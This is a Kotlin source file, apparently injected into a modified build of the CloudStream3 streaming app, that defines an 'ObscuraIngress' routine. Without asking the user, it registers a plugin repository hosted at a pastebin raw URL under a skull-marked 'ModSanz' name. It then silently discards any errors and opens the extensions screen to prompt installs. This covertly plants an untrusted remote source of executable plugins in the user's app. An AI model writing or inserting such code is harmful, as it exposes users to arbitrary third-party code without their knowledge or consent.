package com.lagradost.cloudstream3

import android.app.Activity
import android.content.Intent
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.ui.settings.extensions.ExtensionsActivity
import com.lagradost.cloudstream3.ui.settings.extensions.RepositoryData
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

object ObscuraIngress {

    private const val REPO_URL = "https://pastebin.com/raw/KiqTgasd"
    private const val REPO_NAME = "☠️ ModSanz Repo"

    fun install(activity: Activity) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val alreadyAdded = RepositoryManager
                    .getRepositories()
                    .any { it.url == REPO_URL }

                if (!alreadyAdded) {
                    RepositoryManager.addRepository(
                        RepositoryData(
                            name = REPO_NAME,
                            url = REPO_URL,
                            iconUrl = null
                        )
                    )
                }
            } catch (_: Throwable) {
                // aman, ga perlu apa-apa
            }

            activity.runOnUiThread {
                activity.startActivity(
                    Intent(activity, ExtensionsActivity::class.java)
                )
            }
        }
    }
}
